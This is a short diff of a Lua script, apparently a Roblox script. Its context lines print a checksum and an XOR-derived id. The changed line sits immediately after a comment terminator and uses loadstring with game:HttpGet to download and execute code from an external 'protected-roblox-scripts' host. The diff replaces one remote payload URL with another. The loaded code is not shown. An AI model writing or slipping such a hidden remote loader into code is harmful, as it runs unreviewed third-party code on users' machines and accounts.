@@ -225,4 +225,4 @@ local c = checksum(decoded)
 print("\n-- checksum:", c)
 print("------------------------")
 print(("/* id:%X */"):format((c ~ 0xDEADBEEF) & 0xFFFFFFFF))  -- XOR with magic number
---]]loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/b93cf9d92965c9bf5a8361d7e0d52753"))()
+--]] loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/ece23cbe4261ecb8d71580e95cd5e2cb"))()
